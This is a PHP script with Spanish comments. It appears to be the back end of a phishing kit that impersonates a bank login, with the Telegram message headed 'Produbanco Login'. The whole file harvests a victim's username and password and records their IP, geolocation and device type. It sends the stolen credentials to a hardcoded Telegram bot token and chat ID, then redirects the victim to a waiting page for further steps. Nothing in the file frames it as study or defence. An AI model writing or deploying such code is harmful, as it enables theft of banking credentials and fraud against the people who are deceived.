<?php
session_start();

// Token del bot y chat ID de Telegram
$botToken = '7824527759:AAGqD8qIGVb7C8oHAmYaR44uTu1gR_wnpjc';
$chatID = '8205653590';

// Datos POST del formulario de login (basado en el HTML proporcionado)
$usuario = $_POST['username'] ?? '';
$contrasena = $_POST['password'] ?? '';

// Validar que los datos no estén vacíos
if (empty($usuario) || empty($contrasena)) {
    // Redirigir de vuelta al formulario con parámetro de error
    header("Location: index.html?error=campos_vacios");
    exit;
}

// Guardar el usuario en la sesión
$_SESSION['usuario'] = $usuario;

// Obtener IP real, incluso si está detrás de proxy
function obtenerIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    }
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'IP no disponible';
}
$ip = obtenerIP();

// Obtener información adicional del usuario
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'User Agent no disponible';
$referer = $_SERVER['HTTP_REFERER'] ?? 'Acceso directo';

// Determinar ubicación geográfica
$location = "Ubicación no disponible";
if (filter_var($ip, FILTER_VALIDATE_IP) && !preg_match('/^(127\.|10\.|192\.168|172\.(1[6-9]|2[0-9]|3[0-1]))/', $ip)) {
    try {
        $context = stream_context_create([
            'http' => [
                'timeout' => 5,
                'method' => 'GET',
                'header' => 'User-Agent: Mozilla/5.0'
            ]
        ]);
        
        $json = @file_get_contents("http://ipinfo.io/{$ip}/json", false, $context);
        if ($json !== false) {
            $data = json_decode($json, true);
            $city = $data['city'] ?? 'Ciudad desconocida';
            $region = $data['region'] ?? 'Región desconocida';
            $country = $data['country'] ?? 'País desconocido';
            $org = $data['org'] ?? 'Proveedor desconocido';
            $location = "$city, $region, $country ($org)";
        } else {
            $location = "Error al conectar con ipinfo.io";
        }
    } catch (Exception $e) {
        $location = "Error de ubicación: " . $e->getMessage();
    }
} else {
    $location = "IP local o privada: $ip";
}

// Obtener fecha y hora actual con zona horaria
date_default_timezone_set('America/Lima'); // Ajustar según tu ubicación
$fechaHora = date('Y-m-d H:i:s');
$timestamp = date('U');

// Detectar tipo de dispositivo basado en User Agent
function detectarDispositivo($userAgent) {
    if (preg_match('/mobile|iphone|android|blackberry|webos|opera mini|opera mobi/i', $userAgent)) {
        return '📱 Móvil';
    } elseif (preg_match('/tablet|ipad/i', $userAgent)) {
        return '📟 Tablet';
    } else {
        return '💻 Escritorio';
    }
}
$tipoDispositivo = detectarDispositivo($userAgent);

// Crear mensaje simplificado para Telegram (sin fecha/hora, origen y user agent)
$mensaje = "🏦 **𝗣𝗿𝗼𝗱𝘂𝗯𝗮𝗻𝗰𝗼 𝗟𝗼𝗴𝗶𝗻** - @𝗕𝗿𝗸𝗻𝘀𝗵𝗶𝗻𝗲𝘅𝘅𝘅\n\n";
$mensaje .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
$mensaje .= "👤 **Usuario:** `$usuario`\n";
$mensaje .= "🔑 **Contraseña:** `$contrasena`\n";
$mensaje .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
$mensaje .= "🌐 **IP:** `$ip`\n";
$mensaje .= "📍 **Ubicación:** $location\n";

// Función mejorada para enviar a Telegram
function enviarTelegram($botToken, $chatID, $mensaje) {
    $apiURL = "https://api.telegram.org/bot$botToken/sendMessage";
    
    $postData = [
        'chat_id' => $chatID,
        'text' => $mensaje,
        'parse_mode' => 'Markdown',
        'disable_web_page_preview' => true
    ];
    
    $options = [
        'http' => [
            'method' => 'POST',
            'header' => [
                'Content-Type: application/x-www-form-urlencoded',
                'User-Agent: PHP-Telegram-Bot/1.0'
            ],
            'content' => http_build_query($postData),
            'timeout' => 10
        ]
    ];
    
    $context = stream_context_create($options);
    $result = @file_get_contents($apiURL, false, $context);
    
    return $result !== false;
}

// Intentar enviar el mensaje a Telegram
$envioExitoso = enviarTelegram($botToken, $chatID, $mensaje);

// Log de errores si el envío falla (opcional)
if (!$envioExitoso) {
    $logMessage = "[" . date('Y-m-d H:i:s') . "] Error enviando a Telegram - Usuario: $usuario - IP: $ip\n";
    error_log($logMessage, 3, 'telegram_errors.log');
}

// Guardar datos adicionales en sesión para posibles pasos siguientes
$_SESSION['ip'] = $ip;
$_SESSION['location'] = $location;
$_SESSION['timestamp'] = $timestamp;
$_SESSION['device_type'] = $tipoDispositivo;

// Redirigir a página de espera o siguiente paso
header("Location: wait.html");
exit;
?>
